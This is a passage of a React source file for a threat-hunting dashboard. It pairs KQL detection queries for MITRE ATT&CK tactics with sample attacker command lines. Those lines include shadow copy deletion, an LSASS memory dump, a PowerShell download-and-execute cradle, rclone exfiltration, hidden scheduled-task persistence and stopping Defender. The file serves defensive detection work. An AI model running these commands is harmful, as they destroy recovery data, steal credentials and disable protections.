import React, { useMemo, useState } from 'react';
import { ExternalLink, FileText, Info, Plus, ShieldCheck } from 'lucide-react';
import type { MitreTactic } from '../types';
import { useApp } from '../app/AppContext';
import { MITRE_TECHNIQUES } from '../data/mitreAttck';
import { coveredTechniqueSet, coverageSummary, hasTelemetry, isCovered, tacticCoverage } from '../lib/coverage';
import { cn } from '../lib/cn';
import { Badge, Button, Card, CodeBlock, EmptyState, Meter, PageHeader, SectionLabel, Segmented, Stat } from './ui';

interface PrescribedHunt {
  id: string;
  techniqueId: string;
  techniqueName: string;
  tactic: MitreTactic;
  hypothesisTitle: string;
  threatActors: string[];
  rationale: string;
  requiredTelemetry: string[];
  unifiedQuery: string;
  expectedPattern: string;
}

// Actionable hunt blueprints explicitly tailored for uncovered tactics
const PRESCRIBED_TACTIC_HUNTS: Record<string, PrescribedHunt[]> = {
  'Impact': [
    {
      id: 'hunt-imp-1',
      techniqueId: 'T1490',
      techniqueName: 'Inhibit System Recovery',
      tactic: 'Impact',
      hypothesisTitle: 'Hunt for Volume Shadow Copy Deletion & Recovery Inhibition via LOLBins',
      threatActors: ['BlackCat / ALPHV', 'LockBit 3.0', 'Rhysida', 'Akira'],
      rationale: 'Ransomware actors execute vssadmin, bcdedit, or wbadmin to destroy recovery points prior to encrypting clinical and enterprise file shares.',
      requiredTelemetry: ['EDR Process Creation', 'Windows Event 4688 / Sysmon 1'],
      unifiedQuery: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "wmiprvse.exe")
| where (ProcessCommandLine has_any ("vssadmin", "delete shadows", "wbadmin", "bcdedit") and ProcessCommandLine has_any ("ignoreallfailures", "recoveryenabled no", "delete catalog"))
     or (ProcessCommandLine has "wmic" and ProcessCommandLine has "shadowcopy" and ProcessCommandLine has "delete")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures',
    },
    {
      id: 'hunt-imp-2',
      techniqueId: 'T1486',
      techniqueName: 'Data Encrypted for Impact',
      tactic: 'Impact',
      hypothesisTitle: 'Hunt for Rapid High-Volume File Renames and Extension Appends',
      threatActors: ['BlackCat', 'Royal Ransomware', 'Play Ransomware'],
      rationale: 'Detects processes generating high-frequency file write/rename operations with novel unmapped extensions indicative of bulk encryption.',
      requiredTelemetry: ['EDR File Creation & Modification', 'File Integrity Monitoring'],
      unifiedQuery: `DeviceFileEvents
| where ActionType in ("FileCreated", "FileRenamed", "FileModified")
| where FileName endswith_any (".encrypted", ".locked", ".crying", ".alphv", ".rhysida")
| summarize RenamedCount = count(), UniqueExtensions = dcount(FileName) by InitiatingProcessFileName, DeviceName, bin(TimeGenerated, 5m)
| where RenamedCount > 100
| project TimeGenerated, DeviceName, InitiatingProcessFileName, RenamedCount, UniqueExtensions`,
      expectedPattern: 'rundll32.exe modifying >150 files in clinical user directory with randomized extension.',
    },
  ],
  'Exfiltration': [
    {
      id: 'hunt-exf-1',
      techniqueId: 'T1567.002',
      techniqueName: 'Exfiltration to Cloud Storage',
      tactic: 'Exfiltration',
      hypothesisTitle: 'Hunt for Unauthorized Archive Uploads to Cloud Storage (MEGA / Dropbox / Rclone)',
      threatActors: ['Scattered Spider', 'BlackCat / ALPHV', 'FIN7'],
      rationale: 'Adversaries weaponize legitimate command-line sync utilities (rclone, megasync, curl) to upload compressed sensitive dumps to attacker-controlled cloud storage.',
      requiredTelemetry: ['EDR Process Creation', 'DNS Query Logs', 'Web Proxy Logs'],
      unifiedQuery: `DeviceProcessEvents
| where ProcessCommandLine has_any ("mega.nz", "dropbox.com", "rclone", "transfer.sh", "webhook.site")
     or InitiatingProcessFileName in~ ("rclone.exe", "mega.exe")
| where ProcessCommandLine has_any ("copy", "sync", "upload", "put", "-u")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'rclone.exe copy C:\\Users\\Public\\Clinical_Export.7z remote_dropbox:vault -q',
    },
    {
      id: 'hunt-exf-2',
      techniqueId: 'T1048.002',
      techniqueName: 'Exfiltration Over Asymmetric Encrypted Channel',
      tactic: 'Exfiltration',
      hypothesisTitle: 'Hunt for High-Volume Outbound Data Flows to Uncategorized Autonomous Systems (ASNs)',
      threatActors: ['Lazarus Group', 'Mustang Panda'],
      rationale: 'Exfiltration of stolen intellectual property or database backups through custom TLS/SSL sessions initiated from non-standard server processes.',
      requiredTelemetry: ['Firewall / NetFlow Telemetry', 'EDR Network Events'],
      unifiedQuery: `DeviceNetworkEvents
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe", "onedrive.exe")
| where RemotePort in (443, 8443, 4443, 8080)
| summarize TotalSentBytes = sum(SentBytes) by DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl, bin(TimeGenerated, 1h)
| where TotalSentBytes > 104857600
| project TimeGenerated, DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl, TotalSentBytes`,
      expectedPattern: 'spoolsv.exe transmitting >100MB of encrypted payload to bulletproof hosting IP.',
    },
  ],
  'Lateral Movement': [
    {
      id: 'hunt-lat-1',
      techniqueId: 'T1021.002',
      techniqueName: 'SMB / Windows Admin Shares Execution',
      tactic: 'Lateral Movement',
      hypothesisTitle: 'Hunt for Service Creation & Script Execution over ADMIN$ and C$ Shares',
      threatActors: ['Volt Typhoon', 'FIN7', 'Cobalt Group', 'APT29'],
      rationale: 'Attackers pivot across workstations and domain controllers using PsExec, WMI, or remote service installation targeting hidden administrative shares.',
      requiredTelemetry: ['Windows Event 4688 / Sysmon 1', 'Windows Event 7045 (Service Install)', 'Active Directory Kerberos'],
      unifiedQuery: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("services.exe", "wmiprvse.exe")
| where ProcessCommandLine has_any ("ADMIN$", "C$", "IPC$", "PAExec", "PSEXESVC")
     or (InitiatingProcessFileName =~ "cmd.exe" and ProcessCommandLine has "\\\\10." and ProcessCommandLine has "ADMIN$")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'services.exe creating PSEXESVC on secondary clinical database server.',
    },
    {
      id: 'hunt-lat-2',
      techniqueId: 'T1047',
      techniqueName: 'Windows Management Instrumentation (WMI)',
      tactic: 'Lateral Movement',
      hypothesisTitle: 'Hunt for Remote WMI Process Instantiation (wmic /node)',
      threatActors: ['Volt Typhoon', 'APT41', 'Sandworm'],
      rationale: 'Living-off-the-land adversary execution where wmic.exe is invoked with remote /node arguments to spawn processes on remote hosts without touching disk.',
      requiredTelemetry: ['EDR Process Creation', 'Windows Event 4688'],
      unifiedQuery: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("wmic.exe", "powershell.exe")
| where ProcessCommandLine has "/node:" and ProcessCommandLine has "process" and ProcessCommandLine has "call" and ProcessCommandLine has "create"
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'wmic.exe /node:192.168.10.15 process call create "powershell.exe -enc ..."',
    },
  ],
  'Discovery': [
    {
      id: 'hunt-dsc-1',
      techniqueId: 'T1087.002',
      techniqueName: 'Domain Account Discovery via LDAP',
      tactic: 'Discovery',
      hypothesisTitle: 'Hunt for High-Volume BloodHound / SharpHound LDAP Directory Scraping',
      threatActors: ['Scattered Spider', 'BlackCat', 'Vice Society'],
      rationale: 'Reconnaissance tools query Active Directory domain controllers for privileged group memberships, SPNs, and trust relationships within short time windows.',
      requiredTelemetry: ['Active Directory Event 1644/4738', 'Windows Event 4688 / Sysmon 1'],
      unifiedQuery: `DeviceProcessEvents
| where ProcessCommandLine has_any ("SharpHound", "BloodHound", "invoke-bloodhound", "adfind", "nltest", "net group \"domain admins\" /domain")
     or (InitiatingProcessFileName in~ ("powershell.exe", "cmd.exe") and ProcessCommandLine has_all ("LDAP://", "samAccountType", "adminCount=1"))
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'cmd.exe executing AdFind.exe -f "(objectcategory=person)" -b dc=apex,dc=local',
    },
    {
      id: 'hunt-dsc-2',
      techniqueId: 'T1018',
      techniqueName: 'Remote System Discovery',
      tactic: 'Discovery',
      hypothesisTitle: 'Hunt for Internal Subnet Port Sweeps & Ping Sweeps via PowerShell',
      threatActors: ['Volt Typhoon', 'Lazarus Group'],
      rationale: 'Adversaries utilize fast-loop PowerShell scripts calling System.Net.Sockets.TcpClient or Test-NetConnection to map open SMB, RDP, and WinRM ports across private subnets.',
      requiredTelemetry: ['EDR Script Block Logging (Event 4104)', 'Windows Event 4688'],
      unifiedQuery: `DeviceEvents
| where ActionType == "PowerShellCommand"
| where AdditionalFields has_any ("Test-NetConnection", "System.Net.Sockets.TcpClient", "Ping-Host", "1..254")
| where AdditionalFields has_any ("-Port 445", "-Port 3389", "-Port 5985", "-Port 22")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, AdditionalFields`,
      expectedPattern: '1..254 | % { Test-NetConnection "10.0.1.$_" -Port 445 } executed from non-admin endpoint.',
    },
  ],
  'Command and Control': [
    {
      id: 'hunt-c2-1',
      techniqueId: 'T1071.004',
      techniqueName: 'DNS Tunneling',
      tactic: 'Command and Control',
      hypothesisTitle: 'Hunt for High-Entropy Long Subdomain DNS Queries Indicative of C2 Tunneling',
      threatActors: ['Cobalt Strike', 'Iodine', 'OilRig'],
      rationale: 'Encapsulating commands and beacons inside base64/hex subdomains sent to an authoritative attacker name server to bypass network firewalls.',
      requiredTelemetry: ['DNS Query Logs', 'Zeek / Suricata Network NIDS'],
      unifiedQuery: `DeviceNetworkEvents
| where RemotePort == 53
| extend QueryLength = strlen(RemoteUrl)
| where QueryLength > 45
| summarize QueryCount = count(), UniqueSubdomains = dcount(RemoteUrl) by DeviceName, RemoteUrl, bin(TimeGenerated, 15m)
| where QueryCount > 30 and UniqueSubdomains > 25
| project TimeGenerated, DeviceName, RemoteUrl, QueryCount, UniqueSubdomains`,
      expectedPattern: 'f3a9e1028bc.beacon.adversary-c2-tunnel.top (>50 chars, high entropy)',
    },
    {
      id: 'hunt-c2-2',
      techniqueId: 'T1071.001',
      techniqueName: 'Web Protocols C2 Beaconing',
      tactic: 'Command and Control',
      hypothesisTitle: 'Hunt for Low-Jitter Periodic HTTPS Outbound Beacons to Rare Domains',
      threatActors: ['Sliver', 'Brute Ratel', 'Mythic C2'],
      rationale: 'Command and control agents beaconing outbound over TLS on strict periodic heartbeat intervals with minimal jitter.',
      requiredTelemetry: ['Web Proxy Logs', 'Firewall / NetFlow Telemetry'],
      unifiedQuery: `DeviceNetworkEvents
| where RemotePort in (443, 80)
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "teams.exe", "slack.exe")
| summarize ConnectionCount = count(), TimeIntervals = make_set(bin(TimeGenerated, 1m)) by DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl
| where ConnectionCount > 40
| project DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl, ConnectionCount`,
      expectedPattern: 'rundll32.exe making HTTPS connection every 60.0s to newly registered domain.',
    },
  ],
  'Collection': [
    {
      id: 'hunt-col-1',
      techniqueId: 'T1539',
      techniqueName: 'Steal Web Session Cookie',
      tactic: 'Collection',
      hypothesisTitle: 'Hunt for Browser SQLite Database Access & Session Cookie Thefts',
      threatActors: ['Lumma Stealer', 'RedLine', 'Scattered Spider'],
      rationale: 'Information stealers locate Chrome, Edge, and Firefox user data directories to copy Cookies and Login Data SQLite files containing plaintext tokens.',
      requiredTelemetry: ['EDR File Access Events', 'EDR Process Creation'],
      unifiedQuery: `DeviceFileEvents
| where FileName in~ ("Cookies", "Login Data", "Web Data", "key4.db", "logins.json")
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, FolderPath, FileName`,
      expectedPattern: 'cmd.exe copying %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies to C:\\temp\\',
    },
    {
      id: 'hunt-col-2',
      techniqueId: 'T1114.002',
      techniqueName: 'Email Collection from Exchange Server',
      tactic: 'Collection',
      hypothesisTitle: 'Hunt for Bulk Mailbox Export via New-MailboxExportRequest in Exchange',
      threatActors: ['Midnight Blizzard (APT29)', 'HAFNIUM'],
      rationale: 'Adversaries harvest corporate and clinical mailboxes by triggering Exchange PowerShell cmdlets to dump PST archives to network shares.',
      requiredTelemetry: ['Exchange PowerShell Event Logs', 'AuditLogs'],
      unifiedQuery: `DeviceProcessEvents
| where ProcessCommandLine has_any ("New-MailboxExportRequest", "Get-Mailbox", "Search-Mailbox")
| where ProcessCommandLine has "-FilePath" and ProcessCommandLine has ".pst"
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'powershell.exe -c "New-MailboxExportRequest -Mailbox ceo@apexhealth.org -FilePath \\\\backup\\psts\\ceo.pst"',
    },
  ],
  'Privilege Escalation': [
    {
      id: 'hunt-prv-1',
      techniqueId: 'T1134.001',
      techniqueName: 'Token Impersonation & Duplication',
      tactic: 'Privilege Escalation',
      hypothesisTitle: 'Hunt for SeDebugPrivilege Token Stealing via OpenProcessToken',
      threatActors: ['BlackCat', 'Cobalt Strike', 'Mimikatz'],
      rationale: 'Attackers operating in local admin context duplicate SYSTEM tokens from lsass.exe or winlogon.exe to escalate to NT AUTHORITY\\SYSTEM.',
      requiredTelemetry: ['Windows Event 4673 (Privileged Service Called)', 'EDR Process Creation'],
      unifiedQuery: `DeviceEvents
| where ActionType in ("OpenProcessToken", "DuplicateTokenEx")
| where InitiatingProcessAccountName !in~ ("SYSTEM", "LOCAL SERVICE")
| where AdditionalFields has "SeDebugPrivilege" or AdditionalFields has "SeImpersonatePrivilege"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, AdditionalFields`,
      expectedPattern: 'Untrusted user process invoking DuplicateTokenEx with SYSTEM target PID.',
    },
  ],
  'Persistence': [
    {
      id: 'hunt-prs-1',
      techniqueId: 'T1053.005',
      techniqueName: 'Scheduled Task Creation via schtasks',
      tactic: 'Persistence',
      hypothesisTitle: 'Hunt for Scheduled Tasks Running from AppData, Temp, or System32 LOLBins',
      threatActors: ['Volt Typhoon', 'APT29', 'FIN7'],
      rationale: 'Threat actors establish persistence that survives reboots by creating scheduled tasks running PowerShell or script engines from writable user directories.',
      requiredTelemetry: ['Windows Event 4698 (Task Scheduled)', 'EDR Process Creation'],
      unifiedQuery: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("schtasks.exe", "powershell.exe")
| where ProcessCommandLine has "/create"
| where ProcessCommandLine has_any ("\\\\AppData\\\\", "\\\\Temp\\\\", "\\\\Users\\\\Public\\\\", "cmd.exe /c", "-WindowStyle Hidden")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'schtasks.exe /create /tn "GoogleUpdater" /tr "powershell.exe -w hidden -enc ..." /sc onlogon',
    },
  ],
  'Defense Evasion': [
    {
      id: 'hunt-dfe-1',
      techniqueId: 'T1562.001',
      techniqueName: 'Disable or Modify Security Tools',
      tactic: 'Defense Evasion',
      hypothesisTitle: 'Hunt for Endpoint Agent Service Tampering & EDR Bypass Attempts',
      threatActors: ['Scattered Spider', 'Volt Typhoon', 'Rhysida'],
      rationale: 'Actors disable Windows Defender, CrowdStrike, or SentinelOne services using sc stop, fltmc unload, or registry modifications.',
      requiredTelemetry: ['Windows Event 7036 (Service Control)', 'EDR Registry Events'],
      unifiedQuery: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "net.exe", "sc.exe")
| where (ProcessCommandLine has "stop" or ProcessCommandLine has "delete")
     and ProcessCommandLine has_any ("WinDefend", "Sense", "CSFalconService", "SentinelAgent", "MpsSvc")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'sc.exe stop WinDefend / net stop csfalcontarget',
    },
  ],
  'Reconnaissance': [
    {
      id: 'hunt-rec-1',
      techniqueId: 'T1595.002',
      techniqueName: 'Vulnerability Scanning Against Cloud Perimeters',
      tactic: 'Reconnaissance',
      hypothesisTitle: 'Hunt for Rapid HTTP 404 / 403 Path Traversal Probing on Web Gateways',
      threatActors: ['Volt Typhoon', 'LockBit 3.0', 'Rhysida'],
      rationale: 'Automated vulnerability scanners (nuclei, masscan) sweeping for exposed Citrix, Ivanti, and Fortinet edge devices prior to initial compromise.',
      requiredTelemetry: ['WAF Telemetry', 'Web Server Access Logs'],
      unifiedQuery: `DeviceNetworkEvents
| where ActionType == "InboundConnection"
| where RemoteUrl has_any ("/vpn/index.html", "/dana-na/", "/api/v1/totp/user-backup-code", "/remote/login")
| summarize HitCount = count() by RemoteIP, bin(TimeGenerated, 5m)
| where HitCount > 50
| project TimeGenerated, RemoteIP, HitCount`,
      expectedPattern: '>50 requests in 5 minutes scanning known appliance authentication endpoints.',
    },
  ],
  'Resource Development': [
    {
      id: 'hunt-rsd-1',
      techniqueId: 'T1584',
      techniqueName: 'Compromise Infrastructure (SOHO Routers / KV-Botnet)',
      tactic: 'Resource Development',
      hypothesisTitle: 'Hunt for Administrative Logins Sourced from Known SOHO / Residential Proxy Nodes',
      threatActors: ['Volt Typhoon', 'Scattered Spider'],
      rationale: 'Nation-state and extortion actors route administrative traffic through compromised ASUS, Cisco, and NETGEAR home routers to mask source IPs.',
      requiredTelemetry: ['Identity Broker Logs (Okta, Entra)', 'VPN / Citrix Access Logs'],
      unifiedQuery: `SigninLogs
| where AppDisplayName in ("Azure Portal", "AWS Management Console", "Okta Dashboard")
| where NetworkLocationDetails has_any ("Residential", "Proxy", "TOR")
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, Status`,
      expectedPattern: 'Global admin logging in from residential IP range in foreign jurisdiction.',
    },
  ],
  'Initial Access': [
    {
      id: 'hunt-ini-1',
      techniqueId: 'T1133',
      techniqueName: 'External Remote Services',
      tactic: 'Initial Access',
      hypothesisTitle: 'Hunt for Anomalous VPN / Citrix Gateways Authentications from High-Risk Geos',
      threatActors: ['Volt Typhoon', 'Akira', 'LockBit 3.0'],
      rationale: 'Attackers exploit stale VPN accounts or edge appliance CVEs (CitrixBleed, Ivanti Connect) to establish initial footholds without multi-factor prompts.',
      requiredTelemetry: ['VPN / Citrix Access Logs', 'Authentication Logs (Azure AD / Okta)'],
      unifiedQuery: `SigninLogs
| where AppDisplayName has_any ("Cisco AnyConnect", "Citrix Gateway", "Palo Alto GlobalProtect", "Fortinet SSL VPN")
| where ResultType == 0
| where Location !in ("US", "CA", "GB") or RiskLevelDuringSignIn in ("high", "medium")
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ClientAppUsed, DeviceDetail`,
      expectedPattern: 'Successful VPN authentication for privileged admin originating from unusual foreign autonomous system (ASN).',
    },
    {
      id: 'hunt-ini-2',
      techniqueId: 'T1566.001',
      techniqueName: 'Spearphishing Attachment',
      tactic: 'Initial Access',
      hypothesisTitle: 'Hunt for Office & Email Applications Spawning LOLBins or Script Interpreters',
      threatActors: ['FIN7', 'TA577', 'Mustang Panda'],
      rationale: 'Malicious attachments (Word, Excel, OneNote, ISO) leverage macros or embedded shortcuts to spawn cmd.exe, powershell.exe, or mshta.exe upon user open.',
      requiredTelemetry: ['EDR Process Creation', 'Windows Event 4688 / Sysmon 1'],
      unifiedQuery: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "onenote.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe", "certutil.exe", "rundll32.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName`,
      expectedPattern: 'winword.exe spawning powershell.exe with base64 download cradle.',
    },
  ],
  'Execution': [
    {
      id: 'hunt-exe-1',
      techniqueId: 'T1059.001',
      techniqueName: 'PowerShell Execution',
      tactic: 'Execution',
      hypothesisTitle: 'Hunt for Obfuscated PowerShell Invocations with Hidden Windows and Bypass Flags',
      threatActors: ['BlackCat', 'Cobalt Strike', 'Volt Typhoon', 'Lazarus'],
      rationale: 'Adversaries invoke PowerShell with flags designed to bypass execution policy and hide command windows while retrieving in-memory payloads.',
      requiredTelemetry: ['EDR Process Creation', 'PowerShell Script Block Logging (Event 4104)'],
      unifiedQuery: `DeviceProcessEvents
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-w hidden", "-windowstyle hidden", "-nop", "-noprofile", "bypass", "downloadstring", "iex")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName`,
      expectedPattern: 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://...\'))"',
    },
    {
      id: 'hunt-exe-2',
      techniqueId: 'T1059.003',
      techniqueName: 'Windows Command Shell',
      tactic: 'Execution',
      hypothesisTitle: 'Hunt for Double-Hop CMD.exe Spawning Native Admin LOLBins',
      threatActors: ['Scattered Spider', 'FIN7'],
      rationale: 'Adversaries chain cmd.exe /c calls to execute discovery and lateral movement commands from non-interactive system service contexts.',
      requiredTelemetry: ['EDR Process Creation', 'Windows Event 4688'],
      unifiedQuery: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe", "sqlservr.exe", "httpd.exe", "tomcat.exe", "nginx.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "whoami.exe", "net.exe", "net1.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName`,
      expectedPattern: 'w3wp.exe spawning cmd.exe running whoami /all or net user.',
    },
  ],
  'Credential Access': [
    {
      id: 'hunt-crd-1',
      techniqueId: 'T1003.001',
      techniqueName: 'LSASS Memory Dumping',
      tactic: 'Credential Access',
      hypothesisTitle: 'Hunt for Unauthorized LSASS Memory Access and Handle Acquisition via MiniDump API',
      threatActors: ['Mimikatz', 'BlackCat', 'Scattered Spider', 'Cobalt Strike'],
      rationale: 'Adversaries dump LSASS process memory to carve plaintext credentials, Kerberos tickets, and NTLM hashes for domain escalation.',
      requiredTelemetry: ['EDR Process Access / Handle Events', 'Windows Event 4656 / 4663 / Sysmon 10'],
      unifiedQuery: `DeviceProcessEvents
| where (ProcessCommandLine has_any ("rundll32.exe", "comsvcs.dll", "MiniDump") and ProcessCommandLine has "lsass")
     or (ProcessCommandLine has_any ("procdump", "nanodump", "mimikatz", "sekurlsa", "dumpert"))
     or (FileName in~ ("taskmgr.exe") and ProcessCommandLine has "lsass")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      expectedPattern: 'rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump (lsass.exe PID) C:\\temp\\lsass.dmp full',
    },
    {
      id: 'hunt-crd-2',
      techniqueId: 'T1558.003',
      techniqueName: 'Kerberoasting',
      tactic: 'Credential Access',
      hypothesisTitle: 'Hunt for Anomalous High-Volume RC4 Kerberos TGS Service Ticket Requests',
      threatActors: ['Volt Typhoon', 'FIN7', 'Vice Society'],
      rationale: 'Attackers request Kerberos TGS tickets for accounts with ServicePrincipalNames using weak RC4-HMAC encryption to crack passwords offline.',
      requiredTelemetry: ['Active Directory Event 4769 (TGS Request)', 'Domain Controller Security Logs'],
      unifiedQuery: `SecurityEvent
| where EventID == 4769
| where TicketEncryptionType in ("0x17", "23") // RC4-HMAC
| where ServiceName !in ("krbtgt", "$")
| summarize RequestCount = count(), RequestedServices = make_set(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 10m)
| where RequestCount > 8
| project TimeGenerated, TargetUserName, IpAddress, RequestCount, RequestedServices`,
      expectedPattern: 'Single domain user requesting >8 RC4 TGS tickets for SQL and Backup SPNs in under 10 minutes.',
    },
  ],
};

type TacticFilter = 'all' | 'gaps' | 'covered';

export const AttackHeatmapView: React.FC = () => {
  const { currentClient, clientReports, startReport, sendToDetections, openMatrix } = useApp();

  const covered = useMemo(() => coveredTechniqueSet(clientReports), [clientReports]);
  const summary = coverageSummary(covered);
  const tactics = useMemo(() => tacticCoverage(covered), [covered]);
  const tacticsWithGaps = tactics.filter((t) => t.covered === 0).length;

  const [filter, setFilter] = useState<TacticFilter>('all');
  const [selectedName, setSelectedName] = useState<string>(() => tactics.find((t) => t.covered === 0)?.name ?? tactics[0].name);

  const shown = tactics.filter((t) => (filter === 'gaps' ? t.covered === 0 : filter === 'covered' ? t.covered > 0 : true));
  const selected = tactics.find((t) => t.name === selectedName) ?? tactics[0];
  const packages = PRESCRIBED_TACTIC_HUNTS[selected.name] ?? [];
  const techniques = MITRE_TECHNIQUES.filter((t) => t.tactic === selected.name);

  return (
    <>
      <PageHeader
        title="ATT&CK coverage"
        description={`Which ATT&CK tactics and techniques have been hunted for ${currentClient.name}, and ready-made hunts for the gaps.`}
        actions={
          <Button icon={ExternalLink} onClick={() => openMatrix()}>
            Matrix explorer
          </Button>
        }
      />

      <div className="mb-6 grid grid-cols-2 gap-4 lg:grid-cols-4">
        <Stat label="Techniques hunted" value={`${summary.covered} / ${summary.total}`} detail={`${summary.percent}% of the catalog`} />
        <Stat label="Tactics with no hunts" value={tacticsWithGaps} detail={`of ${tactics.length} tactics`} onClick={() => setFilter('gaps')} />
        <Stat label="Hunt reports" value={clientReports.length} detail="Source of coverage data" />
        <Stat label="Techniques not hunted" value={summary.gaps} onClick={() => openMatrix()} />
      </div>

      <Card className="mb-6">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border px-5 py-3">
          <h2 className="text-sm font-semibold text-fg">Tactics</h2>
          <Segmented<TacticFilter>
            ariaLabel="Filter tactics"
            value={filter}
            onChange={setFilter}
            options={[
              { value: 'all', label: `All (${tactics.length})` },
              { value: 'gaps', label: `No hunts (${tacticsWithGaps})` },
              { value: 'covered', label: `Hunted (${tactics.length - tacticsWithGaps})` },
            ]}
          />
        </div>
        <div className="grid grid-cols-2 gap-2 p-4 sm:grid-cols-4 lg:grid-cols-7">
          {shown.map((t) => {
            const active = t.name === selected.name;
            return (
              <button
                key={t.id}
                type="button"
                onClick={() => setSelectedName(t.name)}
                aria-pressed={active}
                className={cn(
                  'rounded-md border p-2.5 text-left transition-colors',
                  active ? 'border-accent bg-accent-soft' : 'border-border bg-canvas hover:border-border-strong',
                )}
              >
                <div className="truncate text-[13px] font-medium text-fg" title={t.name}>
                  {t.name}
                </div>
                <div className="mt-1 flex items-center justify-between text-xs">
                  <span className={t.covered ? 'text-fg-muted' : 'text-warning-text'}>{t.covered ? `${t.percent}%` : 'No hunts'}</span>
                  <span className="tabular-nums text-fg-subtle">
                    {t.covered}/{t.total}
                  </span>
                </div>
                <Meter value={t.percent} className="mt-1.5 h-1" tone={t.covered ? 'accent' : 'warning'} />
              </button>
            );
          })}
        </div>
      </Card>

      <div className="grid grid-cols-1 gap-6 lg:grid-cols-12">
        {/* Techniques in the selected tactic */}
        <Card className="self-start lg:col-span-4">
          <div className="border-b border-border px-5 py-4">
            <div className="text-xs text-fg-subtle">{selected.id}</div>
            <h2 className="mt-0.5 text-sm font-semibold text-fg">{selected.name}</h2>
            <p className="mt-1 text-[13px] text-fg-muted">{selected.description}</p>
          </div>
          <ul className="divide-y divide-border">
            {techniques.map((t) => {
              const ok = isCovered(covered, t.id);
              return (
                <li key={t.id} className="flex items-center gap-3 px-5 py-2.5">
                  <button type="button" onClick={() => openMatrix(t)} className="min-w-0 flex-1 text-left">
                    <div className="truncate text-[13px] text-fg hover:underline">{t.name}</div>
                    <div className="font-mono text-xs text-fg-subtle">{t.id}</div>
                  </button>
                  {ok ? (
                    <Badge tone="success">Hunted</Badge>
                  ) : (
                    <Button
                      size="sm"
                      variant="ghost"
                      icon={Plus}
                      onClick={() =>
                        startReport({
                          hypothesisTitle: `${t.name} (${t.id})`,
                          hypothesisDescription: t.description,
                          techniqueIds: [t.id],
                          dataSources: t.dataSources,
                          queryLanguage: t.sampleQuery?.language,
                          queryText: t.sampleQuery?.query,
                        })
                      }
                    >
                      Hunt
                    </Button>
                  )}
                </li>
              );
            })}
          </ul>
        </Card>

        {/* Ready-made hunts */}
        <div className="space-y-4 lg:col-span-8">
          <div>
            <h2 className="text-sm font-semibold text-fg">Ready-made hunts for {selected.name}</h2>
            <p className="mt-0.5 text-[13px] text-fg-muted">
              Starting-point queries (KQL). Validate field names against the client's schema before running.
            </p>
          </div>

          {packages.length === 0 ? (
            <Card>
              <EmptyState icon={Info} title="No ready-made hunts for this tactic" description="Start a report from a technique on the left instead." />
            </Card>
          ) : (
            packages.map((h) => {
              const ok = isCovered(covered, h.techniqueId);
              return (
                <Card key={h.id}>
                  <div className="border-b border-border px-5 py-4">
                    <div className="flex flex-wrap items-center gap-2 text-xs text-fg-subtle">
                      <span className="font-mono">{h.techniqueId}</span>
                      <span>{h.techniqueName}</span>
                      <Badge tone={ok ? 'success' : 'warning'}>{ok ? 'Hunted' : 'Not hunted'}</Badge>
                    </div>
                    <h3 className="mt-1.5 text-sm font-semibold leading-snug text-fg">{h.hypothesisTitle}</h3>
                    <p className="mt-1.5 text-[13px] leading-relaxed text-fg-muted">{h.rationale}</p>
                  </div>
                  <div className="space-y-4 px-5 py-4">
                    <div className="grid grid-cols-1 gap-4 text-[13px] sm:grid-cols-2">
                      <div>
                        <SectionLabel>Seen with</SectionLabel>
                        <p className="text-fg-muted">{h.threatActors.join(', ')}</p>
                      </div>
                      <div>
